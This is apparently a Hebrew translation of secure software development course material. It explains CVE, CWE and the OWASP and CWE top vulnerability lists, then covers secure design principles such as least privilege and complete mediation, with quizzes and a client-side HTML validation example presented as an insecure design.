פגיעויות וחשיפות נפוצות (CVE) הוא מילון עולמי של (חלק מ) פגיעויות אבטחת סייבר שנחשפו בפומבי. המטרה של CVE היא להקל על שיתוף נתונים על פגיעויות. לערך במאגר (CVE) יש מספר זיהוי (מזהה), תיאור ולכל הפחות הפניה ציבורית אחת. מזהי CVE הם בעלי תבנית בתצורת CVE-*שנה*-*מספר*, כאשר ה*שנה*  היא השנה שבה הוא דווח וה*מספר* הוא מספר שלם חיובי שרירותי כדי להבטיח שמזהי CVE הם ייחודיים. לדוגמה, [CVE-2014-0160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160) היא פגיעות ספציפית ב- OpenSSL (הנקראת פגיעות הארטבליד Heartbleed) שדווחה לראשונה בשנת 2014. ישנם מסדי נתונים, כגון מסד [הנתונים הלאומי לפגיעות בארה"ב (](https://nvd.nist.gov/)[NVD](https://nvd.nist.gov/)[),](https://nvd.nist.gov/) העוקבים אחר המערך הציבורי הנוכחי של ערכי CVE.

ערכים במאגר הפגיעויות וחשיפות נפוצות מוקצים על-ידי רשות מספור CNA. (CNA) הוא ארגון המורשה להקצות מזהי CVE לפגיעויות המשפיעות על מוצרים בטווח כלשהו שהוגדר מראש. ה- CNA הראשי (המכונה "CNA של המוצא האחרון") יכול להקצות CVE גם אם אף אחד אחר לא יכול (תפקיד זה מאויש כרגע על ידי [MITRE](https://www.mitre.org/)). CNAs רבים הם מפתחי מוצרי תוכנה (כגון Microsoft ו- Red Hat) המקצים מספרי CVE עבור המוצרים שלהם. ישנם גם רכזי צד שלישי לפגיעויות, כגון [מרכז התיאום של CERT](https://sei.cmu.edu/about/divisions/cert/index.cfm), שהם CNAs. כל CNA מקבל בלוק של מספרים שלמים שהוא יכול להשתמש בהם ב- CVEs. משמעות הדבר היא כי CVE-2025-50000 אינה פגיעות מספר 50,000 בשנת 2025, אלא רק כי ה CNA אשר הקצה את מזהה ה CVE היה מורשה להקצות את המספר 50,000 בשנת 2025.

פגיעויות רבות ידועות אינן כוללות הקצאות CVE. קודם כל, CVEs מוקצים רק אם מישהו מבקש הקצאה מ- CNA; אם לא תוגש בקשה, לא יהיה CVE. בנוסף, מאגר הפגיעויות וחשיפות נפוצות הינם מוגבלים בהיקפם  בכוונה. ערכי פגיעויות וחשיפות נפוצות מוענקים רק עבור תוכנות ציבוריות (כולל קדם-מהדורות אם נעשה בהן שימוש נרחב). CVEs בדרך כלל אינם מוקצים לתוכנה שנבנתה בהתאמה אישית שאינה מופצת. הם גם לא מוקצים בדרך כלל לשירותים מקוונים. עם זאת, CVEs הם השיטה הנפוצה ביותר למתן מזהה ייחודי עבור כל פגיעות ידועה, ולכן חשוב לדעת עליהם.

#### סוגים מובילים של פגיעויות

ניתן לקבץ את הרוב המכריע של הפגיעויות לקטגוריות. זו פרקטיקה מאוד שימושית מכיון ברגע שאנחנו מזהים קטגוריות, אנחנו יכולים לקבוע אילו מהן נפוצות ואילו צעדים אנחנו יכולים לנקוט כדי למנוע מפגיעות מסוג זה להתרחש שוב.

 [פירוט החולשות הנפוצות (Common Weakness Enumeration - CWE)](https://cwe.mitre.org/) היא רשימה ארוכה מאוד של חולשות נפוצות. בטרמינולוגיה שלהם, "חולשה" היא קטגוריה (סוג) של פגיעות. שימו לב להבדל בין  CVE ל- CWE: CWE מזהה *סוג* של פגיעות, בעוד ש- CVE מזהה  פגיעות *ספציפית* במוצרים מסוימים (משפחת מוצרים). לכל CWE יש מזהה עם מספר, לדוגמה, CWE-20. נזכיר את CWE מעת לעת, עם זאת, ה-CWE הוא רשימה גדולה, ואנחנו לא יכולים לכסות את כל ה-CWEs בקורס הזה.

כמובן שהסוגים החשובים ביותר או המובילים ביותר של פגיעויות מבחינת הסבירות והחומרה שלהם זוהו. שתיים מהרשימות הפופולריות ביותר של סוגים מובילים של פגיעויות הן:

1. [**רשימת 10 המובילים של פרויקט אבטחת יישומי האינטרנט הפתוחים (OWASP Top 10)**](https://owasp.org/www-project-top-ten/)<br>
רשימה זו, שפותחה על-ידי פרויקט אבטחת יישומי האינטרנט הפתוחים (OWASP), מייצגת *"קונצנזוס רחב לגבי סיכוני האבטחה הקריטיים ביותר ליישומי אינטרנט".* היא נקרא גם OWASP Top 10 סיכוני אבטחה של יישומי אינטרנט.
2. [**רשימת 25 המובילים של CWE**](https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html)<br>זוהי רשימה של הסוגים הנפוצים והקריטיים ביותר של פגיעויות. היא נוצרה על ידי צוות פירוט החולשות הנפוצות (CWE) על ידי ניתוח נתונים על פגיעויות ידועות לאורך שנים רבות. רשימה זו יכולה להיות מיושמת על כל תוכנה, אך נפוץ במיוחד להחיל אותה על תוכנה שאינה יישום אינטרנט (שכן רשימת OWASP מתמקדת ביישומי אינטרנט). נקודה מעניינת: הרשימה מזהה חולשות חשובות מעבר ל-25 הראשונות, כך שניתן לראות מספרים גדולים מ-25 המשויכים לרשימה זו.

ל- OWASP יש רשימות 10 המובילות נוספות עבור סוגים שונים של תוכנות. לדוגמה:

* [עשרת הפרוייקטים למובייל (ניידים) של OWASP](https://owasp.org/www-project-mobile-top-10/) - עשרת היישומים הניידים המובילים

* [פרויקט האינטרנט של הדברים של OWASP](https://wiki.owasp.org/index.php/OWASP_Internet_of_Things_Project) - עשרת הפרוייקטים עבור האינטרנט של הדברים (IoT).

עם זאת, רשימת 10 המובילים של יישום האינטרנט היא הרשימתהידועה ביותר מ- OWASP.

פגיעויות מובילות אלה אינן רק נפוצות, אלא הן נוטות לגרום לפגיעויות חמורות.

הרשימות המובילות המוזכרות כאן משתנות עם הזמן אך למרבה הצער, הן לא משתנות מספיק. רבות מהפגיעויות המובילות ב-CWE Top 25 נותרו ללא שינוי במשך עשרות שנים (לדוגמה, ראה *מחקר תכנון טכנולוגיית אבטחת מחשבים*[כרך I](https://csrc.nist.gov/csrc/media/publications/conference-paper/1998/10/08/proceedings-of-the-21st-nissc-1998/documents/early-cs-papers/ande72a.pdf) ו [כרך II](https://apps.dtic.mil/dtic/tr/fulltext/u2/772806.pdf) מאת James P. Anderson, 1972), ורוב הבעיות המובילות ביישומי אינטרנט הן אותן פגיעויות נפוצות ביישומי אינטרנט מאז שנות ה-90. אז אמנם דברים משתנים, אבל למידה על הסוגים *המובילים* של נקודות תורפה תעזור לכם לשנים קדימה.

במקומות שונים לאורך הקורס תוכלו לראות את סמל פעמון האזעקה . סמל זה מציין שהפגיעויות הנדונות הן כה נפוצות עד שהן נמצאות ברשימת 10 סיכוני האבטחה המובילים של יישומי אינטרנט של OWASP ו/או ברשימת 25 המובילים של CWE.

#### הערך של הכרת סוגים מובילים של פגיעויות

אנו נשקיע זמן רב בקורס זה בסקירת סוגים נפוצים של פגיעויות. הסיכון הקיים בכך הוא שאנו עלולים לחשוב שזהו הדבר היחיד שיש לדעת בפיתוח תוכנה מאובטחת. זה לא נכון.

הימנעות מטעויות נפוצות **_אינה_** מספיקה, כשלעצמה, כדי להפוך את התוכנה למאובטחת.

אבל תלוי איך מודדים דברים, בין 90% ל-99% או יותר פגיעויות מכוסות על ידי הרשימות המובילות. על ידי מניעת טעויות נפוצות, נפחית את מספר הפגיעויות לפחות בסדר גודל! זה הופך את הידיעה - וההתמודדות - עם סוגים נפוצים של פגיעויות לבעלת ערך רב, מכיוון שהיא תהפוך את התוכנה שלך להרבה יותר מאובטחת. האמירה *לעולם אל תטעו* אינה מעשית. לעומת זאת, להתמקד בזיהוי וניהול של סוגי הטעויות הנפוצים ביותר שמובילים לפגיעויות זה אכן מעשי. חלק מהסיבה שפגיעויות אלה נפוצות היא שרוב המפתחים אינם יודעים מה הן; וידיעתן הוא הצעד הראשון לניהולן.

לזיהוי סוגים נפוצים של פגיעויות יש גם יתרון נוסף: הוא יעזור לך לזהות סוגים *אחרים* של פגיעויות. כפי שכבר ציינו, אין תחליף לחשיבה. אבל הניסיון לראות את המערכות כמו תוקף יכול להיות מאתגר למפתחות ומפתחים רבים. על ידי התבוננות בסוגים נפוצים של פגיעויות מהעבר, ניתן להיות רגישים יותר לפגיעויות באופן כללי. אז בעוד שידיעת סוגים נפוצים של נקודות תורפה אינה *מחליפה* את החשיבה, ידיעתן יכולה *לעזור* לך לחשוב.

#### חידון 1.8: פגיעויות

\>\>בחר את המשפט האמיתי.<<

(!) לכל הפגיעויות הידועות לציבור מוקצים מזהי CVE. {{לא, מישהו צריך לבקש מזהה CVE. בנוסף, CVEs מוענקים רק עבור תוכנות שפורסמו לציבור (כולל קדם-מהדורות אם הן נמצאות בשימוש נרחב). CVEs בדרך כלל אינם מוקצים לתוכנה שנבנתה בהתאמה אישית שאינה מופצת. הם גם אינם מוקצים בדרך כלל לשירותים מקוונים.}}

( ) כל פגיעויות וחשיפות נפוצות (CVE) מוקצים על ידי תאגיד MITRE. {{No, CVEs מוקצים על-ידי "רשות מספור CVE" (CNA.)}}

(x) הימנעות מסוגים נפוצים של פגיעויות אינה מספיקה בפני עצמה כדי להפוך את התוכנה למאובטחת, אך היא יכולה לעזור משמעותית בכך.

# תכנון המערכת

פרק זה מתאר כיצד לתכנן מערכת תוכנה כך שתהיה מאובטחת, תוך התמקדות בעקרונות אבטחה מרכזיים כגון הרשאות מינימליות, גישור מלא ואימות קלט.

מטרות הלמידה:

1. נסביר מהן עקרונות תכנון מערכת מאובטחת ונספק דוגמאות לכמה עקרונות מרכזיים מקובלים.

2. נדון במושג ההרשאה הפחותה.

3. נדון בגישור הרשאות מלא ("אי עקיפה"), כולל טעויות נפוצות.

4. נבין את אימות הקלט בסביבה שניתן לסמוך עליה.

5. נדון בעקרונות תכנון מאובטח מקובלים אחרים, במיוחד אלה שזוהו על ידי זלצר ושרודר.

## יסודות תכנון מערכת מאובטחת

### מהן עקרונות אבטחתיות בתכנון מערכת תוכנה?

כאשר כותבים תוכנה לא טריוויאלית, יש לשבור את הבעיה לרכיבים קטנים יותר שעובדים יחד. תהליך זה של החלטה כיצד לשבור בעיה לרכיבים וכיצד הם יעבדו יחד נקרא *תכנון* או *תכנון ארכיטקטורה*. לדוגמה, יש לתכנן ולהחליט כיצד לחלק בעיה לקבוצה מסוימת של מחלקות ושיטות. התוצאה של החלטות אלה נקראת גם תכנון או תכנון ארכיטקטורת תוכנה.

זכרו שתהליך התכנון, כמו כל תהליך פיתוח תוכנה אחר, לא קורה רק פעם אחת. זהו תרחיש נפוץ לנסות ליישם תוכנה, להבין כי התכנון לא עובד, ולאחר מכן לשנות את התכנון. לעתים קרובות יש לשנות תכנון כאשר אתה משנה את מה שהתוכנה עושה. אז תהליך התכנון קורה בכל פעם שאתה חושב על שינוי בפירוק הבעיה שהתוכנה שלך פותרת.

תכנונים מסוימים טובים יותר מאחרים: חלקם קלים יותר לתחזוקה, מהירים יותר וכן הלאה. בפרט, תכנונים מסוימים מאובטחים יותר מאחרים. אין פתרון קסם שמבטיח שהתכנון שלכם מאובטח. אבל אנשים מפתחים תוכנה במשך עשרות שנים, ובאמצעות ניסיון, הם זיהו סט של *עקרונות תכנון* שיכולים לעזור לך לבחור תכנונים טובים על פני רעים.

עקרונות תכנון המערכת הם מדריכים מדויקים המבוססים על ניסיון ופרקטיקה. במילים אחרות, עקרונות התכנון הם כללי אצבע שיעזרו לכם להימנע מבעוד מועד מתכנון גרוע וינחו אתכם לתכנון טוב במקום זאת. עם זאת, עקרונות תכנון מאובטח אינם מבטיחים אבטחה; הם כלי עזר לחשיבה, לא תחליף לחשיבה. לדוגמה, לפעמים עיקרון לא יחול בכלל. לפעמים עקרונות מתנגשים; לדוגמה, עיקרון אחד של תכנון מאובטח הוא שמירה על פשטות, אבל לפעמים אתה צריך יותר מורכבות כדי לבצע משהו מסויים. במקרים נדירים יותר, יכולות להיות סיבות טובות מבחינה אבטחה שמפרות לחלוטין עיקרון. עם זאת, התוכנה שלך תהיה בדרך כלל מאובטחת יותר אם תחשוב על עקרונות תכנון מאובטחים ותנסה ליישם אותם. עקרונות תכנון מאובטחים הם חוכמה מזוקקת, וכדאי לשקול אותם.

כשחושבים על התכנון, צריך לחשוב על אילו רכיבים אתה יכול לסמוך (וכמה), ועל אילו רכיבים אתה לא בהכרח יכול לסמוך. כמה עקרונות תכנון מדברים על *גבול אמון*. גבול האמון הוא פשוט הגבול בין הרכיבים שאתה סומך עליהם לבין הרכיבים שאתה לא בהכרח סומך עליהם. מיקום גבול האמון תלוי בתוכנה שאתה מפתח:

* אם אתה כותב יישום בצד השרת, סביר להניח שאתה נותן אמון במה שמריץ את היישום (לדוגמה, המחשב, מערכת ההפעלה וזמן הריצה של הקונטיינר , אם קיים), אך לא במערכות החיצוניות בצד הלקוח (שחלקן עשויות להיות נשלטות על-ידי תוקף). גבול האמון הוא בין השרת ללקוחות.

* אם אתה כותב אפליקציה סלולרית (לטלפון חכם) שמדברת עם השרת שבשליטתך, סביר להניח שאתה סומך על השרת המרוחק הזה. אתה לא צריך לסמוך על נתיב התקשורת בין היישום שלך לשרת (אז תרצה להשתמש בTLS כדי להצפין אותו). אתה בהחלט לא צריך לסמוך על יישומים אחרים בטלפון החכם, אלא אם כן יש לך סיבה מיוחדת לסמוך עליהם. אז ברור שיש גבול בין היישום שלך לבין (1) האינטרנט ו-(2) יישומים ניידים אחרים. אמון הוא לעתים קרובות לא מוחלט; אתה כנראה סומך על כך שמערכת ההפעלה של הטלפון החכם תפעל עבור אותו משתמש, אך משתמש זה עשוי להיות תוקף, אז אתה כנראה צריך לוודא שהרשאות גישה (סיקרטס/ secrets) מסוימים לעולם לא יגיעו ליישום הנייד בכלל.

#### חידון 2.1: מהם עקרונות תכנון מערכת מאובטחת?

\>\>אם תעקוב אחר עקרונות התכנון של מערכת מאובטחת, תמיד תיצור תוכנה מאובטחת. אמת או שקר?<<

(!) נכון

(x) לא נכון

[הסבר]

למרבה הצער, שמירה על עקרונות תכנון של מערכת מאובטחת אינה מבטיחה תוכנה מאובטחת. במקום זאת, הם רק מדריך חשוב לדרך זו. אנו עדיין צריך *לחשוב*.

[הסבר]

### עקרונות תכנון המערכת מאובטחים מומלצים באופן נרחב

תוכנה נמצאת תחת מתקפה במשך עשרות שנים, ועקרונות עיצוב מאובטחים מרכזיים רבים זוהו בשנת 1975 על ידי ג'רום ה. זלצר ומייקל ד. שרודר (S&S) במאמרם, [*ההגנה על מידע במערכות מחשב*](http://web.mit.edu/Saltzer/www/publications/protection/index.html). מה שיפה ברשימה שלהם הוא שהיא עמדה במבחן הזמן; עקרונות אלה חשובים לא פחות כיום. עקרונות אחרים זוהו מאז, אבל בואו נתחיל עם הרשימה שלהם.

ברשימה שלהם הם מתמקדים *במערכת ההגנה* - כלומר, החלק של המערכת כי האבטחה תלויה. הנה הרשימה שלהם, יחד עם כמה שמות חלופיים:

1. **הפריבילגיה הפחותה**<br>ביותר כל משתמש (אנושי) ותוכנית צריכים לפעול תוך שימוש במספר ההרשאות הנמוך ביותר האפשרי. עיקרון זה מגביל את הנזק כתוצאה מתאונה, טעות או התקפה. היא גם מפחיתה את מספר האינטראקציות הפוטנציאליות בין תוכניות מורשות, כך שסביר להניח ששימושים לא מכוונים, לא רצויים או לא ראויים בהרשאות יתרחשו פחות.

2. **גישור מלא (המכונה אי-עקיפה)**<br>כל ניסיון גישה חייב להיבדק; מקם את המנגנון כך שלא ניתן יהיה לערער עליו. מילה נרדפת למטרה זו היא אי-עקיפה.

3. **כלכלת מנגנון (המכונה פשטות)**<br>המערכת, ובמיוחד החלק שהאבטחה תלויה בו, צריכה להיות פשוטה וקטנה ככל האפשר.

4. **עיצוב פתוח**<br>אסור שמנגנון ההגנה יהיה תלוי בבורות התוקף. במקום זאת, עליך לפעול כאילו המנגנון ידוע לציבור, ובמקום זאת להסתמך על סודיות של פריטים מעטים יחסית הניתנים לשינוי בקלות כמו סיסמאות או מפתחות פרטיים. תוקף לא אמור להיות מסוגל לפרוץ למערכת רק בגלל שהתוקף יודע איך זה עובד. "אבטחה באמצעות אלמוניות" בדרך כלל לא עובד.

5. **ברירות מחדל בטוחות לכשל**<br>התקנת ברירת המחדל צריכה להיות ההתקנה המאובטחת. אם לא בטוח שצריך לאפשר משהו, אל תאפשר את זה.

6. **הפרדת הרשאות (לדוגמה, שימוש באימות דו-גורמי)**<br>הגישה לאובייקטים צריכה להיות תלויה ביותר מתנאי אחד (כגון סיסמה). כך, אם תוקף מצליח לשבור תנאי אחד (למשל, על ידי גניבת מפתח) המערכת נשארת מאובטחת. הערה: לפעמים תוכניות מחולקות לחלקים, כל חלק עם הרשאה אחרת. גישה זו נקראת לעתים באופן מבלבל "הפרדת פריבילגיות" - אך שבירת תוכנית לחלקים בעלי הרשאות שונות היא משהו אחר. בטרמינולוגיה זו, זוהי דוגמה לפריבילגיה מינימלית.

7. **המנגנון הכי פחות נפוץ (aka למזער שיתוף)**למזער<br> את הכמות והשימוש במנגנונים משותפים. הימנע משיתוף קבצים, ספריות, ביצוע ליבה של מערכת ההפעלה או מחשבים עם משהו שאינך בוטח בו, מכיוון שהתוקפים עלולים לנצל אותם.

8. **קבילות פסיכולוגית (aka קלה לשימוש)**<br>הממשק האנושי חייב להיות מתוכנן לשימוש קל כך שהמשתמשים ישתמשו באופן שגרתי ואוטומטי במנגנוני ההגנה בצורה נכונה.

מאז, זוהו גם עקרונות עיצוב מאובטחים אחרים על ידי אנשים שונים; נסקור כמה כאלה במהלך הקורס.

זכרו, עקרונות העיצוב הם פשוט כללי אצבע. כאשר אתה מפרק את הבעיה שלך כדי לפתור אותה, עליך לחשוב על עקרונות אלה, מכיוון שהם יעזרו להנחות אותך ליצירת תוכנה מאובטחת יותר. ישנם מקרים שבהם יהיו לך סיבות טובות *לא* ליישם אותם. עקרונות אלה אינם מחליפים את החשיבה - הם עוזרים *להנחות* אותך כאשר אתה חושב.

לאחר מכן, נבחן ביתר פירוט כמה מהעקרונות הללו, משום שיש להם השלכות שאולי אינן ברורות מאליהן. ביחידה הבאה נתחיל בכך שנסתכל לפחות על פריבילגיה**.

#### חידון 2.2: עקרונות תכנון המערכת מאובטחים מומלצים באופן נרחב

\>\>אם נשמור את אופן הפעולה של המערכת בסוד, המערכת תהיה מאובטחת. אמת או שקר?<<

( ) נכון

(x) לא נכון

[הסבר]

עקרון "העיצוב הפתוח" אומר שאנחנו לא יכולים לסמוך על התוקפים שלא יודעים איך מערכת עובדת. במקום זאת, עלינו לתכנן את המערכות שלנו כך שיישארו מאובטחות גם כאשר התוקף יודע בדיוק איך זה עובד.

[הסבר]

### הפריבילגיה הפחותה ביותר

כבר ציינו כי הפריבילגיה הפחותה היא עיקרון חשוב של עיצוב מאובטח. הרעיון הבסיסי הוא שכל משתמש (אדם או תוכנית) צריך לפעול תוך שימוש בהרשאות המעטות ביותר האפשריות. באופן כללי, אל תאפשר קריאה או כתיבה של מידע אלא אם כן עליך לעשות זאת עבור משתמש זה.

ההרשאה הפחותה ביותר מגבילה את הנזק הפוטנציאלי כתוצאה מהתקיפה, וגם מפחיתה את המורכבות של אינטראקציות הקשורות לאבטחה. זה אפילו משתרע על החלקים הפנימיים של תוכנית: רק החלק הקטן ביותר של תוכנית שזקוק להרשאות צריך (באופן אידיאלי) לקבל אותן. כמובן, בשלב מסוים, זה הופך להיות מסובך מדי לעשות (ואנחנו גם רוצים לשמור על התוכנית פשוטה ככל האפשר).

#### דרכים ליישם את הפריבילגיה הפחותה

להלן מספר דרכים ליישם את הפריבילגיה הפחותה, בהתאם לנסיבות:

1. **אל תיתן לתוכנית הרשאות מיוחדות (כאשר הן מעשיות)**<br>אם ניתן לעשות זאת, עשה זאת, מכיוון שזה הטוב ביותר מנקודת מבט ביטחונית. לדוגמה, לינוקס תומכת בהפיכת תוכניות **setuid** או **setgid**, כך שפשוט הפעלת התוכנית מעניקה לתוכנית את ההרשאות של בעליה. אם אתה יכול להימנע לחלוטין משימוש במנגנון זה, שקול לעשות את זה, כי זה נותן הרשאות מיוחדות לתוכניות. לעתים קרובות יש חלופות בטוחות יותר; לדוגמה, דרישה מאנשים להתחבר באופן ספציפי עם הרשאות (זוהי המטרה של **SUDO**).

2. **מזער את ההרשאות המיוחדות שתוכנית מקבלת, כולל מזעור כל הנתונים הנגישים לה**<br>בלינוקס, ייתכן שיש לך תוכנית מתחת (או להפעיל בשם) קבוצה מיוחדת או משתמש שיש להם רק זכויות ספציפיות, במקום משהו חסוי יותר (כמו שורש). אם אתה קורא לממשק שאילתה של מערכת מסד נתונים, הגבל את הזכויות של משתמש מסד הנתונים שבו משתמש היישום. אם מערכת מסד הנתונים שלך משתמשת ב- SQL, ייתכן שתוכל להשתמש בפקודה SQL GRANT כדי להגביל את ההרשאות שהתוכנית מקבלת. משתמשי Redis עשויים להשתמש בפקודת ACL של Redis כדי להגביל הרשאות.

3. **וותר לצמיתות על**<br> הרשאות בהקדם האפשרי לדוגמה, אם אתה משתמש במזהי קבוצה שמורים של Linux, מזהי משתמשים או ביכולות, שחרר לצמיתות הרשאות נוספות אלה בהקדם האפשרי. בדרך זו, אם ההתקפה מתרחשת לאחר מכן, התוקף אינו יכול לנצל הרשאות אלה.

4. **אם אין באפשרותך לוותר לצמיתות על הרשאות, נסה למזער את הזמן שבו ההרשאה פעילה**<br>פעולה זו פחות יעילה, מכיוון שהתקפות מסוימות עלולות לאלץ תוכניות להפעיל קוד שרירותי. אך התקפות מסוימות יכולות לגרום לתוכניות לבצע רק מספר מוגבל של פעולות, ומזעור הזמן שבו ההרשאה פעילה יפחית את מה שהתוקף יכול לעשות.

5. **חלק את התוכנית למודולים שונים, ותן הרשאות מיוחדות רק למודול אחד או לכמה מודולים (חלקים מהתוכנית)**המודול <br>המורשה באופן אידיאלי אפילו לא ייתן אמון מלא בחלקים האחרים של התוכנית שלך (aka *עיצוב חשוד* הדדית). אם תעשה זאת, אם חלק כלשהו מהתוכנית שלך יהיה חתרני, זה יגביל את מה שתוקף יכול לעשות באופן מיידי. לדוגמה, ייתכן שתפצל את החלק של תוכנית המיישם ממשק משתמש גרפי מחלק אחר בעל הרשאות. מנגנוני הפרדה כמו קונטיינרים, מכונות וירטואליות, seccomp לינוקס וסוגים שונים של עטיפות אבטחה יכולים לעזור לך להפריד חלקים של התוכנית שלך, כך שחתרנות של חלק אחד לא בהכרח לשבור אחר. **_היזהר:_** *הקפד להגדיר מנגנונים אלה כדי להפריד באופן מאובטח את המודולים, ולהגביל את ההרשאות בכל חלק. * מנגנוני הפרדה אלה לרוב אינם חסינים בפני תקלות, לכן אל תניח שהשימוש בהם הופך את התוכנית שלך למאובטחת באופן אוטומטי. עם זאת, הם יכולים להפוך את התוכנית שלך לקשה יותר לתקיפה ועשויים להפחית את הנזק אם התקפה מצליחה.

6. **מזעור (הגבל) את משטח התקיפה **<br>משטח התקיפה* * הוא מערך הפעולות (לדוגמה, ה- API שלו ויציאות הרשת הפתוחות שלו) שתוקף פוטנציאלי יכול לגשת אליהן. לדוגמה, אם אתה מאפשר גישה ציבורית לשיטה כלשהי, אז אתה נותן לכל התוקפים גישה לשיטה זו - האם אתה בטוח שאתה צריך? במידת האפשר, הגבל את הפעולות שתוקף פוטנציאלי יכול לגשת אליהן. אם הציבור לא צריך גישה, אל תיתן לציבור גישה. בפרט, הימנע מהשארת פעולות איתור באגים במערכות ייצור שהתוקף יכול לגשת אליהן; פעולות איתור באגים הן מקור נפוץ לבעיות.

7. **אמת (בדוק) קלט לפני שאתה מקבל**<br> אותו אל תסתפק בקבלת נתונים מתוקף פוטנציאלי; בדוק אותו ביסודיות לפני שתקבל אותו. נדון באימות קלט ביתר פירוט בהמשך. כמובן, עליך לוודא שהתוקפים אינם יכולים לעקוף אימות קלט זה; זו סוגיה כל כך גדולה שיש לה עיקרון משלה, *גישור מלא*, כלומר *אי-עקיפה*. אנחנו נדבר על זה בהמשך.

8. **ארגז חול של התוכנית שלך**<br>הפעל בכוונה את התוכנית (או חלק ממנה) בסביבה עם יכולות מוגבלות במכוון.

9. **מזער הרשאות עבור קבצים ומשאבים אחרים**<br>לדוגמה, בדרך כלל אתה לא צריך קבצים לכתיבה על ידי כולם (אפילו קריא על ידי כולם הוא לעתים קרובות מפוקפק). באנדרואיד, קובץ הניתן לכתיבה על ידי כולם יכול להשתנות על ידי יישום אחר (אולי זדוני).

<br>

 הרשאות שגויות הן סיבה נפוצה כל כך לפגיעויות אבטחה שזה 2021 CWE Top 25 #22 ו- 2019 CWE Top 25 #15. זהו [CWE-732](https://cwe.mitre.org/data/definitions/732.html) (*הקצאת הרשאה שגויה עבור משאב קריטי*). הרשאות שגויות גרועות במיוחד אם  הרשאות ברירת *המחדל* אינן מאובטחות; המקרה המיוחד הוא [CWE-276](https://cwe.mitre.org/data/definitions/276.html) (*הרשאות ברירת מחדל שגויות*).

#### דוגמאות לפריבילגיה מינימלית

בואו נסתכל על כמה דוגמאות ספציפיות.

בעת פיתוח יישומים מבוססי אינטרנט, אל תאפשר למשתמשים לגשת (לקרוא) לקבצים כגון  קבצי **ההכללה והתצורה** של השרת** ** . נתונים אלה עשויים לספק בטעות מספיק מידע (למשל, סיסמאות) כדי לפרוץ למערכת. אם אתה משתמש בשרת אינטרנט מסורתי, שמור את כל מה שאינך צריך כדי לשרת ישירות למשתמשים מחוץ ל"שורש התיעוד "(**DOCROOT);** בדרך זו, התוקפים אינם יכולים אפילו לבקש את המידע בקלות. מנע הגשה של קבצים שידוע לך שאין להגיש ישירות (כגון **הכללת** קבצים).

אל תאפשר למשתמשים לכתוב קבצי תצורת מערכת כברירת מחדל (לדוגמה, קבצי מערכת ב**-/etc** בלינוקס וביוניקס), ובמידת האפשר, שקול למנוע קריאות גם על ידי משתמשים רגילים. הבעיה היא שמנהלי מערכת מכניסים לעתים קרובות סיסמאות ומפתחות לקבצי תצורה. אם יש סיבות להעניק הרשאות קריאה רחבות יותר לחלק מהמידע על תצורת המערכת (לדוגמה,  ב- **/etc**), שקול ליצור ספריית תצורת מערכת במקום קובץ תצורת מערכת שבו שם הספריה מסתיים באופן קונבנציונלי ב**- .d.** ספריות תצורת מערכת הן לעתים קרובות טובות יותר בכל מקרה, מכיוון שהן הופכות את זה לטריוויאלי עבור מנהלי חבילות להוסיף ולהסיר קבצי תצורה ספציפיים. עבור אבטחה, ספריות תצורת מערכת לא רק מפחיתות את הסיכון לשגיאות, אלא שלקבצים ספציפיים (כגון קבצים עם מפתחות סודיים וסיסמאות) יכולות להיות הרשאות מוגבלות יותר. אם אתה משתמש בספריית תצורת מערכת, זה פחות בעיה לאפשר למשתמש לקרוא, כי זה הרבה יותר קל להגן על המפתחות הסודיים וסיסמאות.

אם אתה מיישם API חיצוני (לדוגמה, עם REST או GraphQL), אל תספק פעולת "כתיבה" אלא אם כן אתה מצפה שייעשה בו שימוש. אם אתה מאפשר כתיבה, נסה להגביל באופן מקסימלי *את האנשים* שיכולים לכתוב. לדוגמה, יש בעלים של נתונים ספציפיים ואפשר רק לבעלים לשנות נתונים אלה, במקום לאפשר לכל אחד לשנות דבר. אם זה מעשי, עצב את התוכנה שלך כך שהיא לא תוכל לכתוב נתונים *גם* אם  הם חתרנים על ידי תוקף (אם כי לעתים קרובות זה לא מעשי).

למרבה הצער, מקובל לנהל הרשאות בצורה לא נכונה. לדוגמה, ישנם מקרים רבים שבהם תוכניות לא הצליחו לשחרר הרשאות בכל המקרים (למשל, משום שהעלאת חריג דילגה על הקוד שהשמיט הרשאות, או משום שהקוד שהיה אמור לשחרר הרשאות אינו פועל בכל המקרים).

 ניהול הרשאות לא תקין הוא גורם כה נפוץ לפגיעויות אבטחה, עד כי הוא 2021 CWE Top 25 #29 ו- 2019 CWE Top 25 #24. זהו [CWE-269](https://cwe.mitre.org/data/definitions/269.html) (*ניהול הרשאות לא תקין*).

#### חידון 2.3: הפריבילגיה הקטנה ביותר

\>\>אחת הדרכים *שבהן ייתכן* שתוכל ליישם חלק מהרשאות "ההרשאה הפחותה" (בהתאם לתוכנית) היא להשתמש בהצהרות SQL GRANT כך שלתוכנית לא יהיו זכויות לשנות נתונים מסוימים גם אם תוקף ישתלט על תוכנית זו. אמת או שקר?<<

(!) לא נכון.

(x) נכון.

### גישור מלא (אי עקיפה)

בכל פעם שתוכנית מקבלת בקשה, לפחות ממקור שהתוכנית אינה יכולה לתת בו אמון מלא (הוא נמצא מחוץ לגבולות האמון), התוכנית חייבת לבדוק את הבקשה. דוגמאות לבדיקות אבטחה הן בדיקה שהבקשה מאושרת ושהקלט תקף לפני שאתה פועל על סמך נתונים אלה. עיקרון זה נקרא גם *אי-עקיפה*, משום שהנקודה היא שאסור לתוקף לעקוף בדיקות ביטחוניות.

טעות נפוצה היא לנסות להפעיל בדיקות אבטחה במערכת שהתוקף יכול לשלוט בה. אם תוקף יכול לשלוט במערכת, התוקף יכול לעקוף בקלות את כל בדיקות האבטחה המופעלות על-ידי אותה מערכת. בואו נסתכל על כמה דוגמאות של  עיצובים *לא מאובטחים*.

#### תכנון המערכת לא מאובטח: אימות קלט HTML בצד הלקוח

דוגמה פשוטה לעיצוב לא מאובטח היא כאשר יישום אינטרנט בצד השרת שולח HTML מסוים ללקוח, ו- HTML כולל דרישת אימות מסוימת. לדוגמה, HTML עשוי לכלול את המשפט הבא כדי לדרוש שהאורך המרבי לא יעלה על 100:

~~~~html
    <input id="name" type="text" maxlength="100">
~~~~

HTML זה בסדר אם מטרתו היא להיות בדיקה מהירה כדי להתמודד עם טעויות מקריות. אבל מכיוון שהתוקפים יכולים לשלוט בדפדפן האינטרנט שלהם, בדיקת אורך מקסימלית זו היא טריוויאלית לעקוף. תוקף יכול לשלוח בקלות קלט ארוך בהרבה. אינך  יכול *לסמוך* על דפדפן האינטרנט שיבצע עבורך בדיקה רלוונטית לאבטחה אם התוקף יכול לשלוט בדפדפן האינטרנט או להחליף אותו.

